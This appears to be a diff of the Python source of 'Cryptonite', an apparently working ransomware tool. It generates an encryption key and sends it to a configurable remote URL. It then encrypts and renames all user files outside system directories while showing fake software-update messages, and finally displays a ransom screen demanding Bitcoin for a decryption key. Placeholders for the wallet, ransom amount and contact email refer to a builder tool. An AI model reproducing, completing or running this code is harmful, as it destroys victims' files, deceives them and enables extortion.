@@ -10,29 +10,25 @@ import json
 import tqdm
 import pymsgbox as pmb
 
-
 # ----------------> Cryptonite program begins here. <---------------- #
-
 
 key = Fernet.generate_key()
 fe = Fernet(key)
 dkrpt = random.randint(100000, 999999)
 uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "").replace(".", "")
-# print(dkrpt)
 
 # some GLOBALS
-
 URL = ""                        # <----  REQUIRED (Use exeGen.. It is much easier)
 BTC_AMOUNT = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
 BTC_WALLET = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
 EMAIL = ""                      # <----  REQUIRED (Use exeGen.. It is much easier)
 EXT = ".cryptn8"                # <----  OPTIONAL (Use exeGen.. It is much easier)
 
+fileLists = []                  # stores the files to be encrypted
+fileList = []                   # stores the files to be decrypted
 
-fileLists = []      # stores the files to be encrypted
-fileList = []       # stores the files to be decrypted
 
-
+# --> Directories to be devoid of encryption <-- #
 EXCLUDED_DIRS = [   "/Windows",
                     "/Program Files",
                     "/Program Files (x86)",
@@ -40,13 +36,14 @@ EXCLUDED_DIRS = [   "/Windows",
                 ]
 
 
+# ----------------> Main Cryptonite Class <---------------- #
+
 class Cryptonite():
     def __init__(self,key,fe,dkrpt,uniqKey):
         self.key = key
         self.fernetEncrypt = fe
         self.decryptPlease = dkrpt
         self.uniqueKey = uniqKey
-
 
     def sendKeys(self):
         id = uniqKey
@@ -71,11 +68,8 @@ class Cryptonite():
         except:
             pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
             exit()
-
-
-
+            
     def findFiles(self):
-        
         print("Please be patient, checking for new updates...\n")
         time.sleep(5)
         print("Update found! Downloading the files... \n")
@@ -88,17 +82,13 @@ class Cryptonite():
                         for files in file:
                             files = os.path.join(root, files)
                             fileLists.append(files)
-
         print("Download Completed!\n")
         time.sleep(2)
         print("Installing the Updates. This might take some time. Please be patient... \n")
         self.encrypt()
         os.system("cls" if os.name == 'nt' else "clear") 
 
-
-
-    def encrypt(self):
-        
+    def encrypt(self):        
         for file in tqdm.tqdm(fileLists):
             flag = 0
             newfile = str(file)+EXT
@@ -115,9 +105,7 @@ class Cryptonite():
                         f.write(encryptedData)
                     os.rename(file, newfile)
                 except:
-                    pass 
-
-      
+                    pass     
   
     def decrypt(self):
         for files in fileList:
@@ -135,13 +123,12 @@ class Cryptonite():
                     os.rename(str(files)+EXT, files)
                 except:
                     pass
-
-
-
+                  
+                  
+# ----------------> Graphical User Interface <---------------- #
 class System(Cryptonite):
     def __init__(self):
         super().__init__(key,fe,dkrpt,uniqKey)
-
 
     def warningScreen(self):
         import tkinter as tk
@@ -165,9 +152,6 @@ class System(Cryptonite):
                 pmb.confirm("Wrong KEY!", buttons=['OK'])
                 window.destroy()
                 exit()
-
-
-
         
         window.title("Cryptonite")
         window.resizable(0,0)
@@ -210,13 +194,20 @@ class System(Cryptonite):
 
         window.mainloop()
         
-
+        
+# ----------------> MAIN EXECUTION STARTS HERE <---------------- #
 
 if __name__ == "__main__":
-    
+  
+    # --> object creation <-- #
     cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
     window = System()
 
+    # --> sending info to database <-- #
     cryptn8.sendKeys()
+    
+    # --> encrypting / decrypting <-- #
     cryptn8.findFiles()
+    
+    # --> GUI <-- #
     window.warningScreen()
